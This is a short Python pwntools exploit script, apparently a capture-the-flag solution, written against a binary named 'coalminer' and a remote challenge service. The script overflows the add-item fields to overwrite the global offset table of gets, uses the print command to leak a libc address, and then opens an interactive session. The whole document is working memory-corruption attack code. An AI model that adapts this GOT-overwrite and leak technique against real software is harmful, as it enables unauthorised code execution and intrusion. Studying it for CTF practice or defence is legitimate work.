from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./coalminer"
HOST = "161.35.8.211"
PORT = 9999 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_puts = elf.plt["puts"]
plt_gets = elf.plt["gets"]
got_puts = elf.got["puts"]
got_gets = elf.got["gets"]
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))

def add(n, d):
	conn.sendlineafter("> ", "add")
	conn.sendlineafter("name: \n", n)
	conn.sendlineafter("tion: \n", d)

def p():
	conn.sendlineafter("> ", "print")
	
def exploit():
	n = "a"*8
	n += p64(got_gets)
	d = p64(plt_gets+6)
	#n += p64(got_puts)
	#d = p64(plt_puts+6)
	add(n, d)
	conn.sendlineafter("> ", "p") # execute puts()
	p()
	conn.recvuntil("Item")
	conn.recvline()
	conn.recvline()
	conn.recv(1)
	libc_puts = u64(conn.recv(6)+"\x00\x00")
	print hex(libc_puts)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
